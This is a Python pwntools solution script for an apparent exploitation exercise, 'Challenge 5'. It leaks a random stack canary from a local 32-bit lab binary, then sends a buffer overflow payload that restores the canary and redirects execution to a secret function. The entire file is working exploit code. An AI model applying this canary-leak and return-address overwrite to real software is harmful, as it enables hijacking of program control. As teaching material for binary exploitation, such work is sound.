"""
Challenge 5: Exploit a binary protected with a random canary

SOLUTION
"""

from pwn import *

context.update(arch='i386', os='linux')
pty = process.PTY
elf = context.binary = ELF("./binaries/binary-5-SG12-random")
p = process(elf.path)

print("Get the canary")
payload = b'A'*100 + b'\x09'
print("Send " + str(payload))
p.sendline(payload)
output = p.recvline()
print("Receive output: " + str(output))
# Extract the canary
random_canary = re.findall(r' [0-9A-F]{6,8} ', str(output), re.I)[0]  # STRING
random_canary = int(random_canary, 16)  # INT
random_canary = p32(random_canary)  # HEX

print("Craft payload")
address_of_secret_function = 0x80486c0
buffer_size = 80
offset_canary = 4
fscan_terminator_symbol = b'\x09'

payload = b'A'*(buffer_size+offset_canary) + random_canary + \
    p32(address_of_secret_function) + fscan_terminator_symbol
print("Send " + str(payload))
p.sendline(payload)

print(p.recvline())
